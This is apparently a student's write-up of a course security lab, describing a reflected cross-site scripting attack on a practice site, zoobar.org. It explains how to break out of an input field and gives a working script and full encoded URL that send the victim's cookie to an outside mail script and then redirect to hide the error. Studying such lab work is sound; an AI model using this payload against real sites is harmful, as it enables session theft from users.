Attack A

The goal of this exploit was to craft a url that would utilize the zoomail.org email script in order to
mail a user's cookie to ourselves.  This is exploitable because the code after the user variable in the 
url gets inserted into the HTML as the value for user.  First it is necessary to end the value variable
with an endquote ".  Then it is necessary to end the input element with a >.  After this, you can insert
any javascript you want starting with the <script> tag.  For example, the provided starting point url 
turns this:
<input type="text" name="user" value="" size=10>
Into this:
<input type="text" name="user" value=""><script>alert(document.cookie);</script>" size=10>

Knowing this allows us to insert javascript that then gets exectued by the page.
Instead of displaying the cookie information though, we wanted to convince the webpage to invoke the
zoomail.org script and e-mail the cookie to ourselves.  In order to this this, we had to create a 
javascript image element with the src element set to a url in the format specified by zoomail.org.  We
wanted the payload of the email to be the cookie associated with the zoobar webpage which can be accessed
as "document.cookie".

<script>
new Image().src='http://zoomail.org/sendmail.php?netid=pmcollins2&payload='+document.cookie+'&random='+Math.random();
</script>

This would successfully e-mail us the cookie but would cause "size=10>" to be displayed between the
entry box and view button.  It would also cause a red error message to appear.  In order to get around
this, after e-mailing the cookie we then wanted to switch back to the original webpage.  We did this using
the document.location property in javascript.  

document.location='/users.php';

The final piece was to encode the punctuation in the URL where necessary (: / < > etc).

http://zoobar.org/users.php?user=\"\>\<script\>new\ Image().src\=\'http\:\/\/zoomail.org\/sendmail.php\?netid\=pmcollins2\&payload\=\'\+document.cookie\+\'\&random\=\'\+Math.random()\;document.location\=\'\/users.php\'\;\<\/script\>
